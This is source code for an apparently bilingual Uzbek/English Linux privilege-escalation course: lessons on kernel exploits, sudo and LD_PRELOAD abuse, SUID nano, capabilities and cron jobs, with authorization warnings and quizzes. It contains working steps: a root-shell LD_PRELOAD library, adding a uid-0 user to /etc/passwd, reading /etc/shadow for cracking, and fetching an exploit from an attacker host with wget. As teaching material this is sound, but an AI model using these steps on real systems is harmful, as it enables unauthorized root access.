      {n:"LES",name:t(lang,"Linux Exploit Suggester","Linux Exploit Suggester"),color:"#ff3a5e",desc:{uz:"Yadro versiyasiga mos ma'lum exploitlarni taklif qiladi.",en:"Suggests known exploits matching the kernel version."},proto:"github.com/mzet-/linux-exploit-suggester"},
      {n:"LSE",name:t(lang,"Linux Smart Enumeration","Linux Smart Enumeration"),color:"#a855f7",desc:{uz:"Darajali (-l1, -l2) — shovqinni kamaytiradi.",en:"Level-based (-l1, -l2) — reduces noise."},proto:"github.com/diego-treitos/linux-smart-enumeration"},
      {n:"privchecker",name:"linuxprivchecker",color:"#f7b955",desc:{uz:"Python asosidagi klassik tekshiruvchi.",en:"Classic Python-based checker."},proto:"github.com/linted/linuxprivchecker"},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Muhit vositani tanlaydi","The environment picks the tool")),
    React.createElement(P,null,t(lang,"Nishonning muhiti siz foydalana oladigan vositaga ta'sir qiladi. Masalan, agar nishonda Python o'rnatilmagan bo'lsa, Python'da yozilgan vositani ishga tushira olmaysiz; shuning uchun bash asosidagi LinPEAS/LinEnum ko'pincha ishonchliroq. Faqat bitta vositaga tayanmang — bir nechtasi bilan tanish bo'ling, chunki har biri boshqasi o'tkazib yuborgan narsani topishi mumkin.","The target's environment affects which tool you can use. For example, if Python isn't installed on the target you can't run a Python tool; that's why the bash-based LinPEAS/LinEnum are often more reliable. Don't rely on a single tool — know several, because each may catch what another missed.")),
    React.createElement(H2,{num:"§4"},t(lang,"Interaktiv simulyator: bitta vosita vs ikkinchi vosita bilan tekshirish","Interactive simulator: one tool vs cross-checking with a second")),
    React.createElement(P,null,t(lang,"§3 dagi maslahatni his qiling — xuddi shu nishonni ikki yondashuv bilan tekshiring:","Feel the §3 advice for yourself — check the exact same target two different ways:")),
    React.createElement(AutoToolVerifySim),
    React.createElement(H2,{num:"§5"},t(lang,"Ishlatish","Usage")),
    React.createElement(P,null,t(lang,"Vosita nishonda bo'lmasa, uni o'z mashinangizdan uzatasiz: hujum mashinangizda oddiy HTTP server ko'tarib, nishonda wget bilan yuklab olasiz. So'ng unga bajarish huquqini berib (chmod +x), ishga tushirasiz.","If the tool isn't on the target, you transfer it from your machine: start a simple HTTP server on your attack box and download it on the target with wget. Then give it execute permission (chmod +x) and run it.")),
    React.createElement(Terminal,null,"# Hujum mashinasida (LinPEAS joylashgan papkada):\npython3 -m http.server 8000\n\n# Nishon tizimda:\nwget http://<HUJUM-IP>:8000/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh | tee linpeas_natija.txt   # natijani ham saqlaymiz"),
    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"Avtomatik vositalar soxta ijobiy (mavjud bo'lmagan zaiflikni ko'rsatish) va soxta salbiy (mavjud zaiflikni o'tkazib yuborish) natijalar berishi mumkin. Ularning topilmalarini har doim qo'lda tasdiqlang.","Automated tools can produce false positives (reporting a vuln that isn't there) and false negatives (missing one that is). Always verify their findings manually.")),
    eth("Bu vositalarni faqat o'z laboratoriyangizda yoki ruxsat berilgan nishonlarda ishga tushiring.","Only run these tools in your own lab or on authorized targets."),
    React.createElement(Quiz,{q:{uz:"Nima uchun bitta avtomatik vositaga tayanish yetarli emas?",en:"Why isn't relying on a single automated tool enough?"},opts:[{uz:"Ular juda qimmat",en:"They are too expensive"},{uz:"Muhit (masalan Python yo'q) vositani cheklashi va har biri ba'zi vektorlarni o'tkazib yuborishi mumkin",en:"The environment (e.g. no Python) can limit a tool, and each may miss some vectors"},{uz:"Ular faqat Windows'da ishlaydi",en:"They only work on Windows"},{uz:"Ular parol talab qiladi",en:"They require a password"}],correct:1,exp:{uz:"Nishon muhiti vositani cheklaydi (Python yo'q → Python skript ishlamaydi) va har bir vosita ba'zi vektorlarni o'tkazib yuborishi mumkin — shuning uchun bir nechtasidan foydalaning va qo'lda tasdiqlang.",en:"The target environment limits tools (no Python → Python scripts fail) and each tool can miss vectors — so use several and verify manually."}}));
}
function LessonL34(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Kernel exploit nima?","What is a kernel exploit?")),
    React.createElement(P,null,t(lang,"Linux yadrosi (kernel) tizimdagi xotira, jarayonlar va apparat kabi komponentlar o'rtasidagi aloqani boshqaradi. Bu markaziy vazifa yadroga eng yuqori imtiyozlarni beradi. Shu sababli, yadroning o'zidagi zaiflikdan muvaffaqiyatli foydalanish (kernel exploit) to'g'ridan-to'g'ri root imtiyozlariga olib kelishi mumkin — chunki yadro allaqachon root darajasida ishlaydi.","The Linux kernel manages communication between components such as memory, processes and hardware. This central role gives the kernel the highest privileges. Therefore, successfully exploiting a vulnerability in the kernel itself (a kernel exploit) can lead directly to root privileges — because the kernel already runs at root level.")),
    React.createElement(H2,{num:"§2"},t(lang,"Metodologiya","Methodology")),
    React.createElement(P,null,t(lang,"Kernel exploit metodologiyasi ko'rinishidan oddiy, lekin ehtiyotkorlik talab qiladi. Uch qadamdan iborat: yadro versiyasini aniqlang, o'sha versiyaga mos exploit kodini toping, va uni ishga tushiring.","The kernel-exploit methodology looks simple but demands caution. It has three steps: identify the kernel version, find exploit code matching that version, and run it.")),
    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"Kernel exploit qadamlari",en:"Kernel exploit steps"},steps:[
      {icon:"🔎",text:{uz:"uname -r bilan aniq yadro versiyasini aniqlash",en:"Identify the exact kernel version with uname -r"}},
      {icon:"🌐",text:{uz:"Versiyaga mos exploit qidirish (searchsploit, Google, cvedetails)",en:"Search for a matching exploit (searchsploit, Google, cvedetails)"}},
      {icon:"📥",text:{uz:"Exploit kodini nishonga uzatish (http.server + wget)",en:"Transfer the exploit to the target (http.server + wget)"}},
      {icon:"⚙",text:{uz:"Kompilyatsiya (gcc) va ishga tushirish",en:"Compile (gcc) and run"}},
      {icon:"👑",text:{uz:"Muvaffaqiyatli bo'lsa → root shell",en:"On success → root shell"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Tadqiqot manbalari","Research sources")),
    React.createElement(P,null,t(lang,"Topilmalaringizga asoslanib exploit qidirishning bir necha manbasi bor: searchsploit (oflayn Exploit-DB), Google, va cvedetails.com kabi zaiflik ma'lumotnomalari. Muqobil variant — Linux Exploit Suggester (LES) skripti, u yadro versiyasiga mos ma'lum exploitlarni avtomatik taklif qiladi. Ammo LES soxta ijobiy (ta'sir qilmaydigan zaiflik haqida xabar berish) yoki soxta salbiy (mavjud zaiflikni o'tkazib yuborish) natijalar berishi mumkin, shuning uchun qidiruvda yadro versiyasini juda aniq ko'rsating.","Based on your findings there are several sources to search for exploits: searchsploit (offline Exploit-DB), Google, and vulnerability references like cvedetails.com. An alternative is the Linux Exploit Suggester (LES) script, which automatically suggests known exploits matching the kernel version. But LES can give false positives (reporting a vuln that has no effect) or false negatives (missing an existing one), so be very specific about the kernel version when searching.")),
    React.createElement(Terminal,null,"# Yadro versiyasini aniqlash\nuname -r          # masalan: 3.13.0-24-generic\ncat /proc/version\n\n# Mos exploit qidirish\nsearchsploit linux kernel 3.13\n\n# Nishonga uzatish, kompilyatsiya va ishga tushirish\nwget http://<HUJUM-IP>:8000/exploit.c\ngcc exploit.c -o exploit\n./exploit\n# id  →  uid=0(root) bo'lsa, muvaffaqiyat"),
    React.createElement(H2,{num:"§4"},t(lang,"Ehtiyotkorlik","Caution")),
    React.createElement(P,null,t(lang,"Kernel exploit — eng xavfli privesc usuli. Muvaffaqiyatsiz urinish tizimni buzishi (crash) yoki qayta ishga tushishga majburlashi mumkin. Exploit kodini ishga tushirishdan OLDIN uning qanday ishlashini tushuning: ba'zi kodlar tizimga qaytarib bo'lmaydigan o'zgarishlar kiritadi. Laboratoriya yoki CTF'da bu unchalik muammo emas, lekin real pentestda tizim yaxlitligini buzish mutlaqo qabul qilinmaydi — avval mijoz bilan bu xavfni kelishib oling.","Kernel exploits are the most dangerous privesc method. A failed attempt can crash the system or force a reboot. BEFORE running exploit code, understand how it works: some code makes irreversible changes to the system. In a lab or CTF this matters less, but in a real pentest breaking system integrity is absolutely unacceptable — agree this risk with the client first.")),
React.createElement(H2,{num:"§5"},t(lang,"Interaktiv simulyator: beparvo vs ehtiyotkor","Interactive simulator: reckless vs careful")),
    React.createElement(P,null,t(lang,"§4 dagi xavfni his qiling — xuddi shu kernel exploit'ni ikki yondashuv bilan sinang:","Feel the §4 risk for yourself — try the exact same kernel exploit two different ways:")),
    React.createElement(KernelExploitRiskSim),
        eth("Kernel exploitlar tizimni ishdan chiqarishi mumkin. Ularni faqat o'z laboratoriyangizda yoki mijoz yozma ravishda ruxsat bergan holatdagina ishga tushiring.","Kernel exploits can take a system down. Only run them in your own lab, or where the client has given explicit written authorization."),
    React.createElement(Quiz,{q:{uz:"Nega muvaffaqiyatli kernel exploit root beradi?",en:"Why does a successful kernel exploit yield root?"},opts:[{uz:"Chunki yadro allaqachon eng yuqori (root) imtiyoz darajasida ishlaydi",en:"Because the kernel already runs at the highest (root) privilege level"},{uz:"Chunki u internetni o'chiradi",en:"Because it turns off the internet"},{uz:"Chunki u parolni o'g'irlaydi",en:"Because it steals the password"},{uz:"Chunki u antivirusni yoqadi",en:"Because it enables the antivirus"}],correct:0,exp:{uz:"Yadro tizimning markaziy, eng imtiyozli qismidir; undagi zaiflikdan foydalanish kodni yadro (root) darajasida bajarishga imkon beradi.",en:"The kernel is the central, most privileged part of the system; exploiting a flaw in it lets you run code at kernel (root) level."}}));
}
function LessonL35(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Sudo huquqlari","Sudo rights")),
    React.createElement(P,null,t(lang,"sudo buyrug'i dasturni root imtiyozlari bilan ishga tushirishga imkon beradi. Ba'zan administratorlar oddiy foydalanuvchiga bir necha aniq buyruqni sudo bilan ishlatishga ruxsat beradi — masalan, kichik SOC analitigi Nmap'ni root bilan ishga tushirishi kerak bo'lishi mumkin, lekin to'liq root bo'lmasligi kerak. sudo -l buyrug'i sizga qanday sudo huquqlaringiz borligini ko'rsatadi. Agar biror dasturni sudo bilan ishga tushira olsangiz, GTFOBins (gtfobins.github.io) uni root shell'ga qanday aylantirishni ko'rsatadi.","The sudo command lets you run a program with root privileges. Sometimes admins allow a normal user to run a few specific commands with sudo — for example a junior SOC analyst may need to run Nmap as root without being full root. The sudo -l command shows you what sudo rights you have. If you can run some program with sudo, GTFOBins (gtfobins.github.io) shows how to turn it into a root shell.")),
    React.createElement(H2,{num:"§2"},t(lang,"Ilova funksiyalarini suiiste'mol qilish","Abusing application functions")),
    React.createElement(P,null,t(lang,"Ba'zi ilovalarda tayyor GTFOBins exploit bo'lmaydi, lekin ularning o'z funksiyasini suiiste'mol qilish mumkin. Masalan, Apache2 serveri -f parametri bilan muqobil konfiguratsiya faylini yuklaydi. Agar Apache'ni sudo bilan ishga tushira olsak, uni /etc/shadow faylini \"config\" sifatida yuklashga majburlaymiz — server xato beradi, lekin xato xabari /etc/shadow ning birinchi qatorini (root parol xeshini) oshkor qiladi.","Some applications have no ready GTFOBins exploit, but you can abuse their own functionality. For example, the Apache2 server loads an alternative config file with -f. If we can run Apache with sudo, we force it to load /etc/shadow as a \"config\" — the server errors out, but the error message leaks the first line of /etc/shadow (the root password hash).")),
    React.createElement(SlideImg,{src:"privesc/auto_s05.png",cap:"apache2 -h — parametrlar ro'yxati; -f muqobil ServerConfigFile ni yuklaydi (bu bilan /etc/shadow o'qiladi).",capEn:"apache2 -h — options list; -f loads an alternate ServerConfigFile (abused to read /etc/shadow)."}),
    React.createElement(H2,{num:"§3"},t(lang,"LD_PRELOAD","LD_PRELOAD")),
    React.createElement(P,null,t(lang,"LD_PRELOAD — bu har qanday dasturga umumiy kutubxonalarni (shared libraries) dastur ishga tushishidan OLDIN yuklashga imkon beruvchi muhit o'zgaruvchisi. Agar sudo konfiguratsiyasida \"env_keep\" opsiyasi LD_PRELOAD ni saqlasa, biz o'z zararli kutubxonamizni yaratib, uni sudo bilan ishga tushirilgan dastur yuklashiga majburlashimiz mumkin. Bu kutubxona ishga tushganda root shell ochadi. (Eslatma: agar haqiqiy foydalanuvchi ID effektiv ID dan farq qilsa, LD_PRELOAD hisobga olinmaydi.)","LD_PRELOAD is an environment variable that lets any program load shared libraries BEFORE the program starts. If the sudo configuration keeps LD_PRELOAD via the \"env_keep\" option, we can create our own malicious library and force a sudo-run program to load it. When that library initializes, it opens a root shell. (Note: if the real user ID differs from the effective user ID, LD_PRELOAD is ignored.)")),
    React.createElement(SlideImg,{src:"privesc/auto_s06.png",cap:"sudo -l — env_keep+=LD_PRELOAD yoqilgan; NOPASSWD dasturlar (find, nano, vim) LD_PRELOAD bilan ishlatilishi mumkin.",capEn:"sudo -l — env_keep+=LD_PRELOAD is enabled; the NOPASSWD programs (find, nano, vim) can be used with LD_PRELOAD."}),
    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"LD_PRELOAD vektori",en:"LD_PRELOAD vector"},steps:[
      {icon:"🔎",text:{uz:"sudo -l da env_keep bilan LD_PRELOAD borligini tekshirish",en:"Check for LD_PRELOAD with env_keep in sudo -l"}},
      {icon:"💻",text:{uz:"Root shell ochadigan C kodini yozish (shell.c)",en:"Write C code that opens a root shell (shell.c)"}},
      {icon:"⚙",text:{uz:"Umumiy obyekt (.so) fayliga kompilyatsiya qilish",en:"Compile it into a shared object (.so) file"}},
      {icon:"👑",text:{uz:"sudo LD_PRELOAD=.../shell.so <dastur> → root",en:"sudo LD_PRELOAD=.../shell.so <program> → root"}},
    ]}),
React.createElement(H2,{num:"§4"},t(lang,"Interaktiv simulyator: env_keep LD_PRELOAD ni saqlaydimi?","Interactive simulator: does env_keep preserve LD_PRELOAD?")),
    React.createElement(P,null,t(lang,"§3 dagi hal qiluvchi shartni his qiling — xuddi shu urinishni ikki sozlamada sinang:","Feel the deciding condition from §3 for yourself — try the exact same attempt under two configurations:")),
    React.createElement(EnvKeepSim),
    React.createElement(H2,{num:"§5"},t(lang,"LD_PRELOAD amalda","LD_PRELOAD in practice")),
    React.createElement(P,null,t(lang,"Root qobig'ini ochadigan oddiy C kodini yozamiz (_init funksiyasi setuid(0) va system(\"/bin/bash\") ni bajaradi), so'ng uni gcc bilan umumiy obyekt (.so) fayliga kompilyatsiya qilamiz. Nihoyat, sudo bilan ishlatishimiz mumkin bo'lgan istalgan dasturni (find, apache2 va h.k.) LD_PRELOAD orqali shu faylga yo'naltirib ishga tushiramiz — natijada root qobig'i paydo bo'ladi.","We write simple C code that opens a root shell (the _init function runs setuid(0) and system(\"/bin/bash\")), then compile it with gcc into a shared object (.so) file. Finally we run any program we can use with sudo (find, apache2, etc.) pointing LD_PRELOAD at that file — and a root shell appears.")),
    React.createElement(SlideImg,{src:"privesc/auto_s08.png",cap:"shell.c (root qobig'ini ochadi) → gcc -fPIC -shared -o shell.so shell.c -nostartfiles bilan kompilyatsiya.",capEn:"shell.c (opens a root shell) → compiled with gcc -fPIC -shared -o shell.so shell.c -nostartfiles."}),
    React.createElement(SlideImg,{src:"privesc/auto_s09.png",cap:"sudo LD_PRELOAD=/home/user/ldpreload/shell.so find → id endi uid=0(root). Root olindi.",capEn:"sudo LD_PRELOAD=/home/user/ldpreload/shell.so find → id now shows uid=0(root). Root obtained."}),
    React.createElement(Terminal,null,"# 1) sudo huquqlarini ko'rish (env_keep+=LD_PRELOAD ni izlaymiz)\nsudo -l\n\n# 2) shell.c — root qobig'ini ochadi\ncat > shell.c << 'EOF'\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init(){\n  unsetenv(\"LD_PRELOAD\");\n  setgid(0); setuid(0);\n  system(\"/bin/bash\");\n}\nEOF\n\n# 3) umumiy obyektga kompilyatsiya\ngcc -fPIC -shared -o shell.so shell.c -nostartfiles\n\n# 4) sudo bilan ishlatiladigan istalgan dastur orqali ishga tushirish\nsudo LD_PRELOAD=/home/user/ldpreload/shell.so find\n# id → uid=0(root)"),
    eth("Bu texnikalar faqat o'z laboratoriyangizda yoki yozma ruxsat berilgan pentestda sinaladi. Ruxsatsiz tizimda sudo/LD_PRELOAD suiiste'moli jinoyat.","These techniques are only for your own lab or a written-authorized pentest. Abusing sudo/LD_PRELOAD on an unauthorized system is a crime."),
    React.createElement(Quiz,{q:{uz:"LD_PRELOAD vektori qanday ishlaydi?",en:"How does the LD_PRELOAD vector work?"},opts:[{uz:"Dastur ishga tushishidan oldin zararli umumiy kutubxonani yuklashga majburlab, root shell ochadi",en:"It forces a malicious shared library to load before the program starts, opening a root shell"},{uz:"Internet parolini o'g'irlaydi",en:"It steals the internet password"},{uz:"Diskni formatlaydi",en:"It formats the disk"},{uz:"Yadroni yangilaydi",en:"It updates the kernel"}],correct:0,exp:{uz:"env_keep LD_PRELOAD ni saqlasa, sudo bilan ishga tushirilgan dastur bizning .so kutubxonamizni yuklaydi va u root darajasida qobiq ochadi.",en:"If env_keep preserves LD_PRELOAD, the sudo-run program loads our .so library, which opens a shell at root level."}}));
}
function LessonL36(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"SUID nima?","What is SUID?")),
    React.createElement(P,null,t(lang,"SUID (Set User ID) — Linux'dagi maxsus fayl ruxsati. Oddiy qilib aytganda, u oddiy foydalanuvchiga dasturni fayl EGASIning huquqlari bilan ishga tushirishga ruxsat beradi. Odatda dastur sizning huquqingiz bilan ishlaydi; lekin faylga SUID belgisi qo'yilgan va egasi root bo'lsa, dastur ishlagan vaqtda vaqtincha root vakolatiga ega bo'ladi. Klassik misol — passwd buyrug'i: har bir foydalanuvchi o'z parolini o'zgartira oladi, lekin parollar saqlanadigan /etc/shadow ni faqat root tahrirlaydi. passwd'ga SUID qo'yilgani uchun u vaqtincha root sifatida ishlab, faylga yozadi.","SUID (Set User ID) is a special file permission in Linux. Simply put, it lets a normal user run a program with the permissions of the file's OWNER. Normally a program runs with your rights; but if a file has the SUID bit and its owner is root, the program temporarily gains root authority while it runs. The classic example is passwd: every user can change their own password, but only root may edit /etc/shadow where passwords are stored. Because passwd has SUID, it runs as root just long enough to write to the file.")),
    React.createElement(H2,{num:"§2"},t(lang,"SUID/SGID fayllarni topish","Finding SUID/SGID files")),
    React.createElement(P,null,t(lang,"SUID va SGID (Set Group ID) fayllar ruxsatlarida maxsus \"s\" bitini ko'rsatadi (masalan -rwsr-xr-x). find buyrug'i ularni topadi: find / -type f -perm -04000 -ls 2>/dev/null SUID yoki SGID o'rnatilgan fayllarni ro'yxatlaydi. Topilgan har bir bajariladigan faylni GTFOBins (gtfobins.github.io) bilan solishtiring — u SUID o'rnatilganda ekspluatatsiya qilinishi mumkin bo'lgan dasturlarni ro'yxatlaydi (oldindan filtrlangan ro'yxat: gtfobins.github.io/#+suid). Ammo GTFOBins har doim oson g'alaba bermaydi; ko'pincha oraliq qadamlar kerak.","SUID and SGID (Set Group ID) files show a special \"s\" bit in their permissions (e.g. -rwsr-xr-x). The find command locates them: find / -type f -perm -04000 -ls 2>/dev/null lists files with SUID or SGID set. Compare each executable you find against GTFOBins (gtfobins.github.io) — it lists programs exploitable when SUID is set (pre-filtered list: gtfobins.github.io/#+suid). But GTFOBins doesn't always give an easy win; often intermediate steps are needed.")),
    React.createElement(SlideImg,{src:"privesc/suid_s04.png",cap:"find / -type f -perm -04000 -ls 2>/dev/null — SUID biti o'rnatilgan fayllar (masalan nano, passwd, sudo).",capEn:"find / -type f -perm -04000 -ls 2>/dev/null — files with the SUID bit set (e.g. nano, passwd, sudo)."}),
    React.createElement(SlideImg,{src:"privesc/suid_s05.png",cap:"GTFOBins (gtfobins.github.io/#+suid) — SUID o'rnatilganda ekspluatatsiya qilinadigan ikkilik fayllar ro'yxati.",capEn:"GTFOBins (gtfobins.github.io/#+suid) — the list of binaries exploitable when SUID is set."}),
    React.createElement(H2,{num:"§3"},t(lang,"Ekspluatatsiya 1: /etc/shadow orqali","Exploitation 1: via /etc/shadow")),
    React.createElement(P,null,t(lang,"Aytaylik, nano matn muharririda SUID biti o'rnatilgan va u root'ga tegishli. Bu nano orqali root huquqi bilan istalgan faylni o'qish va tahrirlash mumkinligini anglatadi. Birinchi variant — parol xeshlarini o'g'irlash: nano bilan /etc/shadow va /etc/passwd tarkibini nusxalab, ularni passwd.txt va shadow.txt fayllariga saqlaymiz. So'ng unshadow vositasi bu ikkisini birlashtirib, John the Ripper buzadigan fayl yaratadi.","Suppose nano has the SUID bit set and is owned by root. This means we can read and edit any file with root privileges through nano. The first option is stealing password hashes: with nano we copy the contents of /etc/shadow and /etc/passwd into passwd.txt and shadow.txt. Then the unshadow tool merges the two into a file John the Ripper can crack.")),
    React.createElement(SlideImg,{src:"privesc/suid_s07.png",cap:"SUID nano orqali olingan /etc/passwd va /etc/shadow nusxalari (passwd.txt, shadow.txt) — unshadow uchun tayyorlanadi.",capEn:"Copies of /etc/passwd and /etc/shadow (passwd.txt, shadow.txt) obtained via SUID nano — prepared for unshadow."}),
    React.createElement(SlideImg,{src:"privesc/suid_s08.png",cap:"unshadow passwd.txt shadow.txt > passwords.txt — John the Ripper buzadigan fayl yaratiladi.",capEn:"unshadow passwd.txt shadow.txt > passwords.txt — creates a file John the Ripper can crack."}),
    React.createElement(H2,{num:"§4"},t(lang,"Ekspluatatsiya 2: /etc/passwd ga root foydalanuvchi","Exploitation 2: a root user in /etc/passwd")),
    React.createElement(P,null,t(lang,"Parolni buzishning zerikarli jarayonini chetlab o'tishning boshqa yo'li — /etc/passwd ga root imtiyozli yangi foydalanuvchi qo'shish. Avval openssl passwd bilan parol xeshini yaratamiz, so'ng uni foydalanuvchi nomi va 0:0 (root UID/GID) bilan /etc/passwd ga (SUID nano orqali) yozamiz. Masalan hacker:$1$...:0:0:root:/root:/bin/bash qatori root qobig'ini beradi. Keyin su hacker bilan o'sha foydalanuvchiga o'tsak, id buyrug'i uid=0(root) ni ko'rsatadi — biz root bo'ldik.","Another way to skip the tedious password-cracking process is to add a new root-privileged user to /etc/passwd. First we make a password hash with openssl passwd, then write it (via SUID nano) into /etc/passwd with a username and 0:0 (root UID/GID). For example the line hacker:$1$...:0:0:root:/root:/bin/bash provides a root shell. Then su hacker switches to that user and id shows uid=0(root) — we are root.")),
    React.createElement(SlideImg,{src:"privesc/suid_s09_a.png",cap:"openssl passwd -1 -salt ... — yangi foydalanuvchi uchun parol xeshi yaratiladi.",capEn:"openssl passwd -1 -salt ... — generates a password hash for the new user."}),
    React.createElement(SlideImg,{src:"privesc/suid_s09_b.png",cap:"/etc/passwd ga qo'shilgan hacker qatori: xesh + 0:0 (root UID/GID) → root imtiyozli foydalanuvchi.",capEn:"The hacker line added to /etc/passwd: hash + 0:0 (root UID/GID) → a root-privileged user."}),
    React.createElement(SlideImg,{src:"privesc/suid_s10.png",cap:"su hacker → id endi uid=0(root) ni ko'rsatadi. Oddiy foydalanuvchidan root'ga o'tildi.",capEn:"su hacker → id now shows uid=0(root). We moved from a normal user to root."}),
React.createElement(H2,{num:"§5"},t(lang,"Interaktiv simulyator: qaysi yo'l tezroq?","Interactive simulator: which path is faster?")),
    React.createElement(P,null,t(lang,"§3 va §4 dagi ikkala yo'lni to'g'ridan-to'g'ri solishtiring — bir xil SUID nano imkoniyati, ikki tubdan boshqa natija:","Compare §3 and §4's two paths head to head — the same SUID nano capability, two very different outcomes:")),
    React.createElement(SUIDPathSim),
        React.createElement(Terminal,null,"# SUID/SGID fayllarni topish\nfind / -type f -perm -04000 -ls 2>/dev/null\n\n# Variant 1: shadow + passwd → unshadow → John\nunshadow passwd.txt shadow.txt > passwords.txt\njohn passwords.txt\n\n# Variant 2: /etc/passwd ga root foydalanuvchi qo'shish\nopenssl passwd -1 -salt THM Password123    # $1$THM$... xeshi\n# quyidagi qatorni /etc/passwd ga qo'shamiz (SUID nano bilan):\n# hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash\nsu hacker      # → uid=0(root)"),
    eth("SUID/SGID ekspluatatsiyasini faqat o'z laboratoriyangizda yoki yozma ruxsat berilgan nishonlarda sinang.","Only test SUID/SGID exploitation in your own lab or on written-authorized targets."),
    React.createElement(Quiz,{q:{uz:"SUID biti o'rnatilgan va root'ga tegishli dastur nima qiladi?",en:"What does a program with the SUID bit set and owned by root do?"},opts:[{uz:"Ishlagan vaqtda vaqtincha root (fayl egasi) huquqlari bilan ishlaydi",en:"While running, it temporarily works with root (the file owner's) privileges"},{uz:"Faqat internetni o'chiradi",en:"It only turns off the internet"},{uz:"Parolni ko'rsatadi",en:"It displays the password"},{uz:"Hech qanday ta'sir qilmaydi",en:"It has no effect"}],correct:0,exp:{uz:"SUID dastur uni ishga tushirgan foydalanuvchi emas, fayl egasining (ko'pincha root) imtiyoz darajasi bilan ishlaydi — bu privesc vektori bo'lishi mumkin.",en:"A SUID program runs with the privilege level of the file owner (often root), not the user who launched it — which can be a privesc vector."}}));
}
function LessonL37(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Capabilities (imkoniyatlar)","Capabilities")),
    React.createElement(P,null,t(lang,"Capabilities — administratorlar jarayon yoki bajariladigan faylga imtiyozlarni batafsilroq darajada berish uchun ishlatadigan mexanizm. Masalan, agar SOC analitigiga soket ulanishlarini ochadigan vosita kerak bo'lsa, lekin unga to'liq root berish istalmasa, administrator faqat o'sha faylga tegishli imkoniyatni beradi. Natijada fayl to'liq root bo'lmasdan o'z vazifasini bajaradi. Ammo noto'g'ri berilgan capability privesc vektoriga aylanadi. getcap vositasi yoqilgan imkoniyatlarni ro'yxatlaydi; imtiyozsiz foydalanuvchi sifatida getcap -r / juda ko'p xatolik chiqargani uchun xatolarni /dev/null ga yo'naltiring. Topilgan imkoniyatni (masalan cap_setuid) GTFOBins bilan solishtiring — ko'pincha uni to'g'ridan-to'g'ri root shell'ga aylantirish mumkin.","Capabilities are a mechanism admins use to grant privileges to a process or executable at a finer level. For example, if a SOC analyst needs a tool that opens socket connections but shouldn't get full root, the admin grants only the relevant capability to that file. The file then does its job without being full root. But a misassigned capability becomes a privesc vector. The getcap tool lists enabled capabilities; as an unprivileged user getcap -r / produces many errors, so redirect them to /dev/null. Compare a found capability (e.g. cap_setuid) against GTFOBins — often it can be turned straight into a root shell.")),
    React.createElement(SlideImg,{src:"privesc/suid_s12_b.png",cap:"getcap -r / 2>/dev/null — tizimda o'rnatilgan capability'larni ro'yxatlaydi.",capEn:"getcap -r / 2>/dev/null — lists the capabilities set across the system."}),
    React.createElement(SlideImg,{src:"privesc/suid_s12_a.png",cap:"getcap -r / 2>/dev/null — tizim bo'ylab o'rnatilgan capability'larni izlash.",capEn:"getcap -r / 2>/dev/null — searching for capabilities set across the system."}),
    React.createElement(SlideImg,{src:"privesc/suid_s13_a.png",cap:"cap_setuid'li vim: ./vim -c ':py3 import os; os.setuid(0); os.execl(...)' — root shell'ga aylantiradi.",capEn:"vim with cap_setuid: ./vim -c ':py3 import os; os.setuid(0); os.execl(...)' — turns it into a root shell."}),
    React.createElement(SlideImg,{src:"privesc/suid_s13_b.png",cap:"Natija — cap_setuid vim orqali root qobig'i ochiladi (id → uid=0).",capEn:"The result — a root shell via cap_setuid vim (id → uid=0)."}),
    React.createElement(H2,{num:"§2"},t(lang,"Cron Jobs (rejalashtirilgan vazifalar)","Cron Jobs")),
    React.createElement(P,null,t(lang,"Cron ishlari skript yoki dasturlarni ma'lum vaqtlarda avtomatik ishga tushirish uchun ishlatiladi. Odatiy holda ular joriy foydalanuvchining emas, EGASINING imtiyozlari bilan ishlaydi. G'oya oddiy: agar root imtiyozi bilan ishlaydigan cron vazifasi bo'lsa va biz u ishga tushiradigan skriptni o'zgartira olsak, bizning kodimiz ham root bilan ishlaydi. Tizim bo'ylab cron ishlari /etc/crontab faylida saqlanadi va uni har qanday foydalanuvchi o'qiy oladi. CTF mashinalarida cron har daqiqada bajarilishi mumkin, real pentestda esa ko'proq kundalik/haftalik vazifalarni ko'rasiz.","Cron jobs run scripts or programs automatically at set times. By default they run with the OWNER's privileges, not the current user's. The idea is simple: if a cron job runs as root and we can modify the script it launches, our code also runs as root. System-wide cron jobs are stored in /etc/crontab, which any user can read. On CTF machines cron may run every minute, while in a real pentest you see more daily/weekly jobs.")),
    React.createElement(SlideImg,{src:"privesc/suid_s15.png",cap:"cat /etc/crontab — tizim cron vazifalari; har qanday foydalanuvchi o'qiy oladi.",capEn:"cat /etc/crontab — system cron jobs; readable by any user."}),
    React.createElement(SlideImg,{src:"privesc/suid_s16_a.png",cap:"cat backup.sh — root har daqiqada ishga tushiradigan cron skripti (prices.xls ni tar bilan zaxiralaydi).",capEn:"cat backup.sh — a cron script root runs every minute (backs up prices.xls with tar)."}),
    React.createElement(H2,{num:"§3"},t(lang,"Cron ekspluatatsiyasi","Cron exploitation")),
    React.createElement(P,null,t(lang,"Agar root ishga tushiradigan skriptga yozish huquqingiz bo'lsa, uni teskari qobiq (reverse shell) chaqiradigan qilib o'zgartirasiz. Buyruq sintaksisi mavjud vositalarga bog'liq (masalan nc har doim -e ni qo'llab-quvvatlamaydi). Real pentestda tizim yaxlitligini buzmaslik uchun har doim teskari qobiqni afzal ko'ring. So'ng hujum mashinangizda tinglovchi (nc -lvnp) ochasiz; cron ishga tushganda root imtiyozli qobiq keladi.","If you have write access to a script that root runs, you modify it to call a reverse shell. The command syntax depends on the available tools (e.g. nc doesn't always support -e). In a real pentest always prefer a reverse shell so you don't break system integrity. Then you open a listener (nc -lvnp) on your attack box; when cron runs, a root-privileged shell arrives.")),
